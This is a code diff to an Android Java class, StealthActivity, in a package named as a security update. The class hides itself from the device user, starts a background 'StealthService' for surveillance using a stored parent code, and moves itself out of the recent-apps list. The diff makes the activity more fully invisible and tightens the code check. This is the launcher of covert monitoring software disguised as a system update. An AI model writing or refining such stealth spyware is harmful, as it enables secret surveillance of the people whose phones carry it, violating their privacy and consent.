@@ -1,12 +1,13 @@
 package com.security.update;
 
-import android.app.Activity;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
-import android.util.Log;
+import android.view.Window;
+import android.view.WindowManager;
+import androidx.appcompat.app.AppCompatActivity;
 
-public class StealthActivity extends Activity {
+public class StealthActivity extends AppCompatActivity {
     
     private SharedPreferences prefs;
     
@@ -14,33 +15,32 @@ public class StealthActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // No UI - completely invisible
-        setContentView(android.R.layout.simple_list_item_1);
-        getWindow().setBackgroundDrawable(null);
+        // Make completely invisible
+        requestWindowFeature(Window.FEATURE_NO_TITLE);
+        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
+                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        
+        // No setContentView - completely invisible
         
         prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
         
-        // Check if this is first launch
+        // STRICT CHECK: Must have verified parent code
         String parentCode = prefs.getString("parent_code", "");
+        boolean isVerified = prefs.getBoolean("code_verified", false);
         
-        if (parentCode.isEmpty()) {
-            // Show login only if no code exists
-            startActivity(new Intent(this, LoginActivity.class));
+        if (parentCode.isEmpty() || !isVerified) {
+            // No valid code, show login IMMEDIATELY
+            Intent loginIntent = new Intent(this, LoginActivity.class);
+            startActivity(loginIntent);
         } else {
-            // Start surveillance silently
-            startSurveillanceSilently(parentCode);
+            // Already have verified code, start stealth service directly
+            Intent serviceIntent = new Intent(this, StealthService.class);
+            serviceIntent.putExtra("PARENT_CODE", parentCode);
+            startService(serviceIntent);
         }
         
-        finish(); // Close this invisible activity
-    }
-    
-    private void startSurveillanceSilently(String code) {
-        // Start main service silently
-        Intent serviceIntent = new Intent(this, StealthService.class);
-        serviceIntent.putExtra("PARENT_CODE", code);
-        startService(serviceIntent);
-        
-        // Hide app from recent apps
+        // Hide immediately
         moveTaskToBack(true);
+        finish();
     }
 }
